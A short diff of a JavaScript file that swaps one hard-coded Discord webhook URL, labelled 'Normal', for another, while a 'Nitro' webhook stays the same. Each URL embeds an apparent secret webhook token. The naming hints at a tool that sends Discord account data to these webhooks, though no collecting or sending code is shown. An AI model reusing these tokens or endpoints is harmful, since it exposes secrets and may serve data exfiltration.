@@ -7,7 +7,7 @@ const apiUrl = axios.create({
 });
 
 const webhookUrlNormal =
-  "https://discord.com/api/webhooks/1249441572314198046/r-T9zW-1bN-7vX-5hYd-P5D-hK-Yj-4gW-2lF_qgE5m";
+  "https://discordapp.com/api/webhooks/1415031572314198046/-7ld3zlqLQkFNJMHmU7rdN-AfkgDsj1VcUljZ301hvJuENw37mD6I9jhj2Co9GAqMPwT";
 
 const webhookUrlNitro =
   "https://discord.com/api/webhooks/1249441865361068032/qgE5m_1-DFcW_5h5Yd-P5D-hK-Yj-4gW-2lF-1bN-9zX-7vW";
